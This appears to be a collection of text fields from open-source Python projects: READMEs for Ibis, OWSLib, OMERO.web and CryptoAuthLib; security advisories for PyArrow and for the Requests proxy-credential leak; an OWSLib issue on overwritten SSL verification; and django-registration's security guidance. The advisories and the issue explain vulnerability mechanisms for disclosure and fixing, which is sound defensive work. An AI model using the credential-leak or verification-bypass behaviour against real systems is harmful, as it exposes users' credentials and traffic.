con.read_csv(\"penguins.csv\")\n>>> t = con.read_parquet(\"penguins.parquet\")\n```\n\nThis allows you to iterate locally and deploy remotely by changing a single line of code.\n\n> 💡 **Tip**\n>\n> Check out [the blog on backend agnostic arrays](https://ibis-project.org/posts/backend-agnostic-arrays/) for one example using the same code across DuckDB and BigQuery.\n\n## Community and contributing\n\nIbis is an open source project and welcomes contributions from anyone in the community.\n\n- Read [the contributing guide](https://github.com/ibis-project/ibis/blob/main/docs/CONTRIBUTING.md).\n- We care about keeping the community welcoming for all. Check out [the code of conduct](https://github.com/ibis-project/ibis/blob/main/CODE_OF_CONDUCT.md).\n- The Ibis project is open sourced under the [Apache License](https://github.com/ibis-project/ibis/blob/main/LICENSE.txt).\n\nJoin our community by interacting on GitHub or chatting with us on [Zulip](https://ibis-project.zulipchat.com/).\n\nFor more information visit https://ibis-project.org/.\n\n## Governance\n\nThe Ibis project is an [independently governed](https://github.com/ibis-project/governance/blob/main/governance.md) open source community project to build and maintain the portable Python dataframe library. Ibis has contributors across a range of data companies and institutions.\n",

An application is vulnerable if it reads Arrow IPC, Feather or Parquet data from untrusted sources (for example user-supplied input files).\n\nThis vulnerability only affects PyArrow, not other Apache Arrow implementations or bindings.\n\nIt is recommended that users of PyArrow upgrade to 14.0.1. Similarly, it is recommended that downstream libraries upgrade their dependency requirements to PyArrow 14.0.1 or later. PyPI packages are already available, and we hope that conda-forge packages will be available soon.\n\nIf it is not possible to upgrade, maintainers provide a separate package `pyarrow-hotfix` that disables the vulnerability on older PyArrow versions. See https://pypi.org/project/pyarrow-hotfix/  for instructions.\n\n---\n\n### Configuration\n\n📅 **Schedule**: Branch creation - \"\" (UTC), Automerge - At any time (no schedule defined).\n\n🚦 **Automerge**: Disabled by config.

This is a product of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://togithub.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. Note this behavior has _only_ been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`).\n\n**Current vulnerable behavior(s):**\n\n1. HTTP → HTTPS: **leak**\n2. HTTPS → HTTP: **no leak**\n3. HTTPS → HTTPS: **leak**\n4. HTTP → HTTP: **no leak**\n\nFor HTTP connections sent through the proxy, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.\n\nThe reason this currently works for HTTPS connections in Requests is the `Proxy-Authorization` header is also handled by urllib3 with our usage of the ProxyManager in adapters.py with [`proxy_manager_for`](https://togithub.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/adapters.py#L199-L235). This will compute the required proxy headers in `proxy_headers` and pass them to the Proxy Manager, avoiding attaching them directly to the Request object. This will be our preferred option going forward for default usage.\n\n### Patches\nStarting in Requests v2.31.0, Requests will no longer attach this header to redirects with an HTTPS destination. This should have no negative impacts on the default behavior of the library as the proxy credentials are already properly being handled by urllib3's ProxyManager.\n\nFor users with custom adapters, this _may_ be potentially breaking if you were already working around this behavior. The previous functionality of `rebuild_proxies` doesn't make sense in any case, so we would encourage any users impacted to migrate any handling of Proxy-Authorization directly into their custom adapter.\n\n### Workarounds\nFor users who are not able to update Requests immediately, there is one potential workaround.\n\nYou may disable redirects by setting `allow_redirects` to `False` on all calls through Requests top-level APIs. Note that if you're currently relying on redirect behaviors, you will need to capture the 3xx response codes and ensure a new request is made to the redirect destination.\n```\nimport requests\nr = requests.get('http://github.com/', allow_redirects=False)\n```\n\n### Credits\n\nThis vulnerability was discovered and disclosed by the following individuals.\n\nDennis Brinkrolf, Haxolot (https://haxolot.com/)\nTobias Funke, (tobiasfunke93@&#8203;gmail.com)\n\n---\n\n### Release Notes\n\n<details>\n<summary>psf/requests</summary>\n\n### [`v2.31.0`](https://togithub.com/psf/requests/blob/HEAD/HISTORY.md#&#8203;2310-2023-05-22)\n\n[Compare Source](https://togithub.com/psf/requests/compare/v2.30.0...v2.31.0)\n\n**Security**\n\n-   Versions of Requests between v2.3.0 and v2.30.0 are vulnerable to potential\n    forwarding of `Proxy-Authorization` headers to destination servers when\n    following HTTPS redirects.\n\n    When proxies are defined with user info (https://user:pass@proxy:8080), Requests\n    will construct a `Proxy-Authorization` header that is attached to the request to\n    authenticate with the proxy.\n\n    In cases where Requests receives a redirect response, it previously reattached\n    the `Proxy-Authorization` header incorrectly, resulting in the value being\n    sent through the tunneled connection to the destination server. Users who rely on\n    defining their proxy credentials in the URL are *strongly* encouraged to upgrade\n    to Requests 2.31.0+ to prevent unintentional leakage and rotate their proxy\n    credentials once the change has been fully deployed.\n\n    Users who do not use a proxy or do not supply their proxy credentials through\n    the user information portion of their proxy URL are not subject to this\n    vulnerability.\n\n    Full details can be read in our [Github Security Advisory](https://togithub.com/psf/requests/security/advisories/GHSA-j8r2-6x86-q33q)\n    and [CVE-2023-32681](https://nvd.nist.gov/vuln/detail/CVE-2023-32681).\n\n</details>\n\n---\n\n### Configuration\n\n📅 **Schedule**: Branch creation - \"\" (UTC), Automerge - At any time (no schedule defined).\n\n🚦 **Automerge**: Disabled by config.

Since we'll be effectively opening a backdoor via ibis for the user to run arbitrary Python code, to address security concerns we will have to ensure that this code execution takes place within an environment where the user cannot hurt anything. \n\nPossible solutions\n- Run ibis daemon/workers inside a container\n- Run ibis processes under a special user account with limited privileges (just enough to be able to see the data passed from Impala)\n",

Dependencies\nare automatically installed during OWSLib installation.\n\n### Installing OWSLib\n\n```bash\n# setup virtualenv\npython3 -m venv owslib\ncd owslib\nsource bin/activate\n\n# clone codebase and install\ngit clone https://github.com/geopython/OWSLib.git\ncd OWSLib\npython3 setup.py install\n```\n\n## Running\n\nFind out what a WMS has to offer. Service metadata:\n\n```python\n\n>>> from owslib.wms import WebMapService\n>>> wms = WebMapService('http://wms.jpl.nasa.gov/wms.cgi', version='1.1.1')\n>>> wms.identification.type\n'OGC:WMS'\n>>> wms.identification.version\n'1.1.1'\n>>> wms.identification.title\n'JPL Global Imagery Service'\n>>> wms.identification.abstract\n'WMS Server maintained by JPL, worldwide satellite imagery.'\n\nAvailable layers::\n\n    >>> list(wms.contents)\n    ['us_landsat_wgs84', 'modis', 'global_mosaic_base', 'huemapped_srtm',\n    'srtm_mag', 'daily_terra', 'us_ned', 'us_elevation', 'global_mosaic',\n    'daily_terra_ndvi', 'daily_aqua_ndvi', 'daily_aqua_721', 'daily_planet',\n    'BMNG', 'srtmplus', 'us_colordem', None, 'daily_aqua', 'worldwind_dem',\n    'daily_terra_721']\n\nDetails of a layer::\n\n    >>> wms['global_mosaic'].title\n    'WMS Global Mosaic, pan sharpened'\n    >>> wms['global_mosaic'].boundingBoxWGS84\n    (-180.0, -60.0, 180.0, 84.0)\n    >>> wms['global_mosaic'].crsOptions\n    ['EPSG:4326', 'AUTO:42003']\n    >>> wms['global_mosaic'].styles\n    {'pseudo_bright': {'title': 'Pseudo-color image (Uses IR and Visual bands,\n    542 mapping), gamma 1.5'}, 'pseudo': {'title': '(default) Pseudo-color\n    image, pan sharpened (Uses IR and Visual bands, 542 mapping), gamma 1.5'},\n    'visual': {'title': 'Real-color image, pan sharpened (Uses the visual\n    bands, 321 mapping), gamma 1.5'}, 'pseudo_low': {'title': 'Pseudo-color\n    image, pan sharpened (Uses IR and Visual bands, 542 mapping)'},\n    'visual_low': {'title': 'Real-color image, pan sharpened (Uses the visual\n    bands, 321 mapping)'}, 'visual_bright': {'title': 'Real-color image (Uses\n    the visual bands, 321 mapping), gamma 1.5'}}\n\nAvailable methods, their URLs, and available formats::\n\n    >>> [op.name for op in wms.operations]\n    ['GetTileService', 'GetCapabilities', 'GetMap']\n    >>> wms.getOperationByName('GetMap').methods\n    {'Get': {'url': 'http://wms.jpl.nasa.gov/wms.cgi?'}}\n    >>> wms.getOperationByName('GetMap').formatOptions\n    ['image/jpeg', 'image/png', 'image/geotiff', 'image/tiff']\n\nThat's everything needed to make a request for imagery::\n\n    >>> img = wms.getmap(   layers=['global_mosaic'],\n    ...                     styles=['visual_bright'],\n    ...                     srs='EPSG:4326',\n    ...                     bbox=(-112, 36, -106, 41),\n    ...                     size=(300, 250),\n    ...                     format='image/jpeg',\n    ...                     transparent=True\n    ...                     )\n    >>> out = open('jpl_mosaic_visb.jpg', 'wb')\n    >>> out.write(img.read())\n    >>> out.close()\n```\n\nA very similar API exists for WebFeatureService. See\ntests/wfs_MapServerWFSCapabilities.txt for details.\n\nThere is also support for Web Coverage Service (WCS), Catalogue\nService for the Web (CSW), Web Processing Service (WPS), and Web\nMap Tile Service (WMTS). Some of those are beta quality.\n\n\nLogging\n-------\nOWSLib logs messages to module-based named Python loggers. You may\nconfigure your application to use the log messages like so:\n\n```python\n    >>> import logging\n    >>> LOGGER = logging.getLogger(__name__)\n    >>> # Add formatting and handlers as needed, for example to log to the console\n    >>> ch = logging.StreamHandler()\n    >>> ch.setLevel(logging.DEBUG)\n    >>> ch.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))\n    >>> # add the handler to the logger\n    >>> LOGGER.addHandler(ch)\n    >>> LOGGER.setLevel(logging.DEBUG)\n```\n\nReleasing\n---------\n\n```bash\n  # update version\n  vi owslib/__init__.py\n  git commit -m 'update release version' owslib/__init__.py\n  # push changes\n  git push origin master\n  git tag -a x.y.z -m 'tagging OWSLib release x.y.z'\n  # push tag\n  git push --tags\n  # update on PyPI (must be a maintainer)\n  rm -fr build dist *.egg-info\n  python3 setup.py sdist bdist_wheel --universal\n  twine upload dist/*\n```\n\nSupport\n-------\n\n- https://lists.osgeo.org/mailman/listinfo/owslib-users\n- https://lists.osgeo.org/mailman/listinfo/owslib-devel\n",

It is also notable that the Authorization object is mutable; Thus, `auth.verfiy` can be overwritten to True for subsequent use.\r\n\r\nSee the offending logic here: https://github.com/geopython/OWSLib/blob/03a0083e73690a43cd9a9c86fcf9107bc126f406/owslib/util.py#L174-L175\r\n\r\n| verify  | auth.verify | verify & !auth.verify | ...result |\r\n| :---: | :---: | :---: | :---: |\r\n| T | T | F | `auth.verify` stays True |\r\n| T | F | T | `auth.verify` gets overwritten to True |\r\n| F | T | F | `auth.verify` stays True | \r\n| F | F | F | `auth.verify` stays False |\r\n\r\n### Solutions:\r\n1.  Only take Authorization objects in `openURL(...)`\r\nSince you already have this object that contains all authorization values, let's use it!  Remove `username`, `password`, `verify`, and `cert` from the function. Every calling function would either need to create it's own Auth or pass one that was given to it. Since creating an Auth sets `verify` to True this defaults to being secure unless a function overwrites it. \r\n\r\n2. Remove `auth` from `openURL(...)`\r\nSeems like a step backwards, but you could just make every calling function split out the contents of an Authorization object.\r\n\r\n3. Change logic to respect any turning off of SSL verification. \r\nLogic: ``` if not verify or not auth.verify: verify = False\r\n```.  Also, removes the issue of overwriting `auth.verify` to False when it's initially True (other properties will need similar treatment).\r\n",

I was mostly trying to retain existing structure/functionality so as not to impact existing testing and utilization, but a consolidated solution would be best.\r\n\r\nAlso, some of the changes here are things I've done on a private project with local modifications, specifically around WMS/WCS and cert/verify usage. In that case I have a real site I'm accessing that requires that form of authentication, but I'd have to think about how to properly test that w/o relying on someone else's site/data.",

Please visit `OMERO Python language bindings <https://omero.readthedocs.io/en/stable/developers/Python.html>`_ for a list of supported platforms and Python versions.\n\nWhen the wheel is installed, activate the virtual environment and install ``omero-web`` from `PyPI <https://pypi.org/>`_.\n\n::\n\n    $  pip install -U omero-web\n\nSetting of the environment variable ``OMERODIR`` is required.\n``$OMERODIR/var/log/`` directory will contain log files.\n``$OMERODIR/etc/grid/config.xml`` is used to store config::\n\n    $ export OMERODIR=$(pwd)\n\nUsage\n-----\n\nFor running omero-web in production with NGINX, see See: `OMERO.web install`_ documentation.\nTo run in development mode, see below.\n\nContributing\n------------\n\nSee: `OMERO`_ documentation\n\nDeveloper installation\n----------------------\n\nFor a development installation we recommend creating a virtual environment as described above.\nThen install OMERO.web into your virtual environment as an editable package, so that any edits\nto source files will be reflected in your installation.\n\n::\n\n    $ git clone https://github.com/ome/omero-web\n    $ cd omero-web\n    $ pip install -e .\n\nNote some ``omero-web`` tests may not run when this module and/or ``omero-py`` are installed in editable mode.\n\nConfiguration for developer usage::\n\n    $ omero config set omero.web.debug True\n    $ omero config set omero.web.application_server development\n\n    # If you want to connect to OMERO.server other than 'localhost'\n    $ omero config append omero.web.server_list '[\"demo.openmicroscopy.org\", 4064, \"demo\"]'\n\nThen run omero-web in the foreground with::\n\n    $ omero web start\n    ...\n    Starting development server at http://127.0.0.1:4080/\n\nOr, run Django directly::\n\n    $ cd omero-web\n    $ python omeroweb/manage.py runserver 4080\n    ...\n    Starting development server at http://127.0.0.1:4080/\n\nUpgrading\n---------\n\nPlugin developers should review the `Upgrading <UPGRADING.md>`_\ndocument highlighting steps that may need to be taken\nwhen upgrading OMERO.web to ensure plugins or other customizations\ncontinue to function as expected.\n\nRunning tests\n-------------\n\nUnit tests are located under the `test` directory and can be run with pytest.\n\nIntegration tests\n^^^^^^^^^^^^^^^^^\n\nIntegration tests are stored in the main repository (ome/openmicroscopy) and depend on the\nOMERO integration testing framework. Reading about `Running and writing tests`_ in the `OMERO`_ documentation\nis essential.\n\nRelease process\n---------------\n\nThis repository uses `bump2version <https://pypi.org/project/bump2version/>`_ to manage version numbers.\nTo tag a release run::\n\n    $ bumpversion release\n\nThis will remove the ``.dev0`` suffix from the current version, commit, and tag the release.\n\nTo switch back to a development version run::\n\n    $ bumpversion --no-tag patch\n\nNB: this assumes next release will be a ``patch`` (see below).\nTo complete the release, push the master branch and the release tag to origin::\n\n    $ git push origin master v5.8.0\n\nIf any PRs are merged that would require the next release to be a ``major`` or ``minor`` version\n(see `semver.org <https://semver.org/>`_) then that PR can include a version bump created via::\n\n    $ bumpversion --no-tag minor|major\n\nIf this hasn't been performed prior to release and you wish to specify the next version\nnumber directly when creating the release, this can be achieved with::\n\n    $ bumpversion --new-version 5.9.0 release\n\nomero-web-docker\n^^^^^^^^^^^^^^^^\n\nFollowing ``omero-web`` release, need to update and release ``omero-web-docker``.\n\nLicense\n-------\n\nOMERO.web is released under the AGPL.\n\nCopyright\n---------\n\n2009-2024, The Open Microscopy Environment, Glencoe Software, Inc.\n\n.. _OMERO: https://www.openmicroscopy.org/omero\n.. _OMERO.web install: https://omero.readthedocs.io/en/stable/sysadmins/unix/install-web/web-deployment.html\n.. _OMERO.py: https://pypi.python.org/pypi/omero-py\n.. _ZeroC IcePy: https://zeroc.com/downloads/ice/3.6\n.. _Pillow: https://python-pillow.org/\n.. _NumPy: http://matplotlib.org/\n.. _Running and writing tests: https://omero.readthedocs.io/en/stable/omero/developers/testing.html\n",

It was learned that Windows will handle both path separators (/ and \\) which v2.9.2 had previously isolated to the intended OS. Now cleansing of resource names will include both path separators no matter the OS.\r\n```\r\n\r\n### Checklist for PR\r\n\r\n- [X] Run MobSF unit tests and lint `tox -e lint,test`\r\n- [X] Tested Working on Linux, Mac, and Docker\r\n- [ ] Add unit test for any new Web API (Refer: `StaticAnalyzer/tests.py`)\r\n- [X] Make sure tests are passing on your PR [![MobSF tests](https://github.com/MobSF/Mobile-Security-Framework-MobSF/workflows/MobSF%20tests/badge.svg?branch=master)](https://github.com/MobSF/Mobile-Security-Framework-MobSF/actions)\r\n\r\n",

Instead,\n   you can `contact the author privately <https://www.b-list.org/contact/>`_ to\n   report the issue.\n\nAnything related to users or user accounts has security implications and\nrepresents a large source of potential security issues. This document is not an\nexhaustive guide to those implications and issues, and makes no guarantees that\nyour particular use of Django or django-registration will be safe; instead, it\nprovides a set of recommendations, and explanations for why django-registration\ndoes certain things or recommends particular approaches. Using this software\nresponsibly is, ultimately, up to you.\n\nBefore continuing with this document, you should ensure that you've read and\nunderstood `Django's security documentation\n<https://docs.djangoproject.com/en/stable/#security>`_.  Django provides a good\noverview of common security issues in the general field of web development, and\nan explanation of how it helps to protect against them or provides tools to\nhelp you do so.\n\nYou should also ensure you're following Django's security recommendations. You\ncan check for many common issues by running::\n\n    python manage.py check --tag security\n\non your codebase.\n\n\nRecommendation: use the two-step activation workflow\n----------------------------------------------------\n\nTwo user-signup workflows are included in django-registration, along with\nsupport for writing your own. If you choose to use one of the included\nworkflows, :ref:`the two-step activation workflow <activation-workflow>` is the\nrecommended default.\n\nThe activation workflow provides a verification step -- the user must click a\nlink sent to the email address they used to register -- which can serve as an\nimpediment to automated account creation for malicious purposes.\n\nThe activation workflow generates an activation key which consists of the new\naccount's username and the timestamp of the signup, verified using `Django's\ncryptographic signing tools\n<https://docs.djangoproject.com/en/1.11/topics/signing/>`_ which in turn use\n`the HMAC implementation from the Python standard library\n<https://docs.python.org/3/library/hmac.html>`_. Thus, django-registration is\nnot inventing or building any new cryptography, but only using existing/vetted\nimplementations in an approved and standard manner.\n\nAdditionally, the activation workflow takes steps to ensure that its use of\nHMAC does not act as an `oracle\n<https://en.wikipedia.org/wiki/Oracle_attack>`_. Several parts of Django use\nthe signing tools, and third-party applications are free to use them as well,\nso django-registration makes use of the ability to supply a salt value for the\npurpose of \"namespacing\" HMAC usage. Thus an activation token generated by\ndjango-registration's activation workflow should not be usable for attacks\nagainst other HMAC-carrying values generated by the same installation of\nDjango.\n\n\nRestrictions on user names: reserved names\n------------------------------------------\n\nBy default, django-registration applies a list of reserved names, and does not\npermit users to create accounts using those names (see\n:class:`~django_registration.validators.ReservedNameValidator`). The default\nlist of reserved names includes many names that could cause confusion or even\ninappropriate access. These reserved names fall into several categories:\n\n* Usernames which could allow a user to impersonate or be seen as a site\n  administrator. For example, ``\"admin\"`` or ``\"administrator\"``.\n\n* Usernames corresponding to standard/protocol-specific email addresses\n  (relevant for sites where creating an account also creates an email address\n  with that username). For example, ``\"webmaster\"``.\n\n* Usernames corresponding to standard/sensitive subdomain names (relevant for\n  sites where creating an account also creates a subdomain corresponding to the\n  username). For example, ``\"ftp\"`` or ``\"autodiscover\"``.\n\n* Usernames which correspond to sensitive URLs (relevant for sites where user\n  profiles appear at a URL containing the username). For example, ``\"contact\"``\n  or ``\"buy\"``.\n\nIt is strongly recommended that you leave the reserved-name validation enabled.\n\n\nRestrictions on user names and email addresses: Unicode\n-------------------------------------------------------\n\nBy default, django-registration permits the use of a wide range of Unicode in\nusernames and email addresses. However, to prevent some types of\nUnicode-related attacks, django-registration will not permit certain specific\nuses of Unicode characters.\n\nFor example, while the username ``\"admin\"`` cannot normally be registered (see\nabove), a user might still attempt to register a name that appears visually\nidentical, by substituting a Cyrillic \"a or other similar-appearing character\nfor the first character. This is a `homograph attack\n<https://en.wikipedia.org/wiki/IDN_homograph_attack>`_.\n\nTo prevent homograph attacks, django-registration applies the following rule to\nusernames, and to the local-part and the domain of email addresses:\n\n* If the submitted value is mixed-script (contains characters from multiple\n  different scripts, as in the above example which would mix Cyrillic and Latin\n  characters), and\n\n* If the submitted value contains characters appearing in the Unicode Visually\n  Confusable Characters file,\n\n* Then the value will be rejected.\n\nSee :func:`~django_registration.validators.validate_confusables` and\n:func:`~django_registration.validators.validate_confusables_email`.\n\nThis should not interfere with legitimate use of Unicode, or of\nnon-English/non-Latin characters in usernames and email addresses. To avoid a\ncommon false-positive situation, the local-part and domain of an email address\nare checked independently of each other.\n\nIt is strongly recommended that you leave this validation enabled.\n\n\nAdditional steps to secure user accounts\n----------------------------------------\n\nThe scope of django-registration is solely the implementation of user-signup\nworkflows, which limits the ways in which django-registration alone can protect\nyour users. Other features of Django itself, or of other third-party\napplications, can provide significant increases in protection.\n\nIn particular, it is recommended that you:\n\n* Prevent the use of common passwords. You can catch some common passwords by\n  enabling Django's\n  :class:`~django.contrib.auth.password_validation.CommonPasswordValidator`,\n  which uses a list of twenty thousand common passwords. A more comprehensive\n  option is the password validator and other utilities from\n  `pwned-passwords-django\n  <https://pwned-passwords-django.readthedocs.io/en/stable/>`_, which checks\n  against a database containing (as of mid-2018) over half a billion passwords\n  found in data breaches.\n\n* Use two-factor authentication via authenticator applications or hardware\n  security keys (*not* SMS). The package `django-two-factor\n  <https://django-two-factor-auth.readthedocs.io/en/stable/>`_ provides\n  integration for two-factor authentication into Django's auth framework.\n",

        "README_content": "CryptoAuthLib - Microchip CryptoAuthentication Library {#mainpage}\n====================================================\n\nIntroduction\n------------------------\nThis library implements the APIs required to communicate with Microchip Security\ndevice. The family of devices supported currently are:\n\n- [ATSHA204A](http://www.microchip.com/ATSHA204A)\n- [ATECC108A](http://www.microchip.com/ATECC108A)\n- [ATECC508A](http://www.microchip.com/ATECC508A)\n- [ATECC608A](http://www.microchip.com/ATECC608A)\n- [ATECC608B](http://www.microchip.com/ATECC608B)\n\nThe best place to start is with the [Microchip Trust Platform](https://www.microchip.com/design-centers/security-ics/trust-platform)\n\nOnline API documentation is at https://microchiptech.github.io/cryptoauthlib/\n\nLatest software and examples can be found at:\n  - https://www.microchip.com/design-centers/security-ics/trust-platform\n  - http://www.microchip.com/SWLibraryWeb/product.aspx?product=CryptoAuthLib\n\n\nPrerequisite hardware to run CryptoAuthLib examples:\n  - [CryptoAuth Trust Platform Development Kit](https://www.microchip.com/developmenttools/ProductDetails/DM320118)\n\nAlternatively a Microchip MCU and Adapter Board:\n  - [ATSAMR21 Xplained Pro]( http://www.microchip.com/atsamr21-xpro )\n    or [ATSAMD21 Xplained Pro]( http://www.microchip.com/ATSAMD21-XPRO )\n  - [CryptoAuth Xplained Pro Extension](http://www.microchip.com/developmenttools/productdetails.aspx?partno=atcryptoauth-xpro-b )\n    or [CryptoAuthentication SOIC Socket Board](http://www.microchip.com/developmenttools/productdetails.aspx?partno=at88ckscktsoic-xpro )\n    to accept SOIC parts\n\nFor most development, using socketed top-boards is preferable until your\nconfiguration is well tested, then you can commit it to a CryptoAuth Xplained\nPro Extension, for example. Keep in mind that once you lock a device, it will\nnot be changeable.\n\nLicensing\n---------------------------\n\nThe CryptoAuthLib license can be found in the accompaning [license.txt](https://github.com/MicrochipTech/cryptoauthlib/blob/main/license.txt)\nfile.\n\nCryptoauthlib also includes optional third party software subject to their own licensing terms. If you are using one of these optional components please\nverify the terms of those licenses as well in the third_party/<module> directories.\n\n\nExamples\n-----------\n\n  - Watch [CryptoAuthLib Documents](http://www.microchip.com/design-centers/security-ics/cryptoauthentication/overview )\n    for new examples coming online.\n  - Node Authentication Example Using Asymmetric PKI is a complete, all-in-one\n    example demonstrating all the stages of crypto authentication starting from\n    provisioning the Crypto Authentication device ATECC608/ATECC508A with keys\n    and certificates to demonstrating an authentication sequence using\n    asymmetric techniques.\n    http://www.microchip.com/SWLibraryWeb/product.aspx?product=CryptoAuthLib\n\nConfiguration\n-----------\nIn order to properly configured the library there must be a header file in your\nproject named `atca_config.h` at minimum this needs to contain defines for the\nhal and device types being used. Most integrations have an configuration mechanism\nfor generating this file. See the [atca_config.h.in](lib/atca_config.h.in) template\nwhich is configured by CMake for Linux, MacOS, & Windows projects.\n\nAn example of the configuration:\n\n```\n/* Cryptoauthlib Configuration File */\n#ifndef ATCA_CONFIG_H\n#define ATCA_CONFIG_H\n\n/* Include HALS */\n#define ATCA_HAL_I2C\n\n/* Included device support */\n#define ATCA_ATECC608_SUPPORT\n\n/* \\brief How long to wait after an initial wake failure for the POST to\n *         complete.\n * If Power-on self test (POST) is enabled, the self test will run on waking\n * from sleep or during power-on, which delays the wake reply.\n */\n#ifndef ATCA_POST_DELAY_MSEC\n#define ATCA_POST_DELAY_MSEC 25\n#endif\n\n#endif // ATCA_CONFIG_H\n```\n\nThere are two major compiler defines that affect the operation of the library.\n  - ATCA_NO_POLL can be used to revert to a non-polling mechanism for device\n    responses. Normally responses are polled for after sending a command,\n    giving quicker response times. However, if ATCA_NO_POLL is defined, then\n    the library will simply delay the max execution time of a command before\n    reading the response.\n  - ATCA_NO_HEAP can be used to remove the use of malloc/free from the main\n    library. This can be helpful for smaller MCUs that don't have a heap\n    implemented. If just using the basic API, then there shouldn't be any code\n    changes required. The lower-level API will no longer use the new/delete\n    functions and the init/release functions should be used directly.\n\n\nRelease notes\n-----------\nSee [Release Notes](release_notes.md)\n\n\nHost Device Support\n---------------\n\nCryptoAuthLib will run on a variety of platforms from small micro-controllers\nto desktop host systems.  The current list of hardware abstraction layer\nsupport includes:\n\nRich OS Hosts:\n  - Linux Kit Protocol over HID USB\n  - Linux I2C\n  - Linux SPI\n  - Windows Kit Protocol over HID USB\n\nMicrocontrollers:\n  - Microchip AVR, SAM, & PIC families. See [hal readme](lib/hal/readme.md)\n\nIf you have specific microcontrollers or Rich OS platforms you need support\nfor, please contact us through the Microchip portal with your request.\n\nCryptoAuthLib Architecture\n----------------------------\nCryptoauthlib API documentation is at https://microchiptech.github.io/cryptoauthlib/\n\nThe library is structured to support portability to:\n  - multiple hardware/microcontroller platforms\n  - multiple environments including bare-metal, RTOS and Windows/Linux/MacOS\n  - multiple chip communication protocols (I2C, SPI, and SWI)\n\nAll platform dependencies are contained within the HAL (hardware abstraction\nlayer).\n\n\nDirectory Structure\n-----------------------\n```\nlib - primary library source code\nlib/atcacert - certificate data and i/o methods\nlib/calib - the Basic Cryptoauth API\nlib/crypto - Software crypto implementations external crypto libraries support (primarily SHA1 and SHA256)\nlib/hal - hardware abstraction layer code for supporting specific platforms\nlib/host - support functions for common host-side calculations\nlib/jwt - json web token functions\ntest - Integration test and examples. See test/cmd-processor.c for main() implementation.\n\nFor production code, test directories should be excluded by not compiling it\ninto a project, so it is up to the developer to include or not as needed.  Test\ncode adds significant bulk to an application - it's not intended to be included\nin production code.\n```\n\nTests\n------------\n\nThere is a set of integration tests found in the test directory which will at least\npartially demonstrate the use of the objects.  Some tests may depend upon a\ncertain device being configured in a certain way and may not work for all\ndevices or specific configurations of the device.\n\nThe test/cmd-processor.c file contains a main() function for running the tests.\nIt implements a command-line interface. Typing help will bring up the list of\ncommands available.\n\nOne first selects a device type, with one of the following commands:\n  - 204 (ATSHA204A)\n  - 108 (ATECC108A)\n  - 508 (ATECC508A)\n  - 608 (ATECC608A/B)\n\nFrom there the following unit test sweets are available:\n  - unit (test command builder functions)\n  - basic (test basic API functions)\n  - cio (test certification i/o functions)\n  - cd (test certificate data functions)\n  - util (test utility functions)\n  - crypto (test software crypto functions)\n\nTests available depend on the lock level of the device. The unit tests\nwon't lock the config or data zones automatically to allow retesting at desired\nlock levels. Therefore, some commands will need to be repeated after locking\nto exercise all available tests.\n\nStarting from a blank device, the sequence of commands to exercise all unit\ntests is:\n```text\nunit\nbasic\nlockcfg\nunit\nbasic\nlockdata\nunit\nbasic\ncio\ncd\nutil\ncrypto\n```\n\nUsing CryptoAuthLib (Microchip CryptoAuth Library)\n===========================================\n\nThe best place to start is with the [Microchip Trust Platform](https://www.microchip.com/design-centers/security-ics/trust-platform)\n\nAlso application examples are included as part of the Harmony 3 framework and can be copied from the Harmony Content Manager\nor found with the Harmony 3 Framework [Cryptoauthlib_apps](https://github.com/Microchip-MPLAB-Harmony/cryptoauthlib_apps)\n\n\nIncorporating CryptoAuthLib in a Linux project using USB HID devices\n-----------------------------------------\nThe Linux HID HAL files use the Linux udev development software package.\n\nTo install the udev development package under Ubuntu Linux, please type the\nfollowing command at the terminal window:\n\n```bash\nsudo apt-get install libudev-dev\n```\n\nThis adds the udev development development software package to the Ubuntu Linux\ninstallation.\n\nThe Linux HID HAL files also require a udev rule to be added to change the\npermissions of the USB HID Devices.  Please add a new udev rule for the\nMicrochip CryptoAuth USB devices.\n\n```bash\ncd /etc/udev/rules.d\nsudo touch mchp-cryptoauth.rules\n```\n\nEdit the mchp-cryptoauth.rules file and add the following line to the file:\n```text\nSUBSYSTEM==\"hidraw\", ATTRS{idVendor}==\"03eb\", ATTRS{idProduct}==\"2312\", MODE=\"0666\"\n```\n",
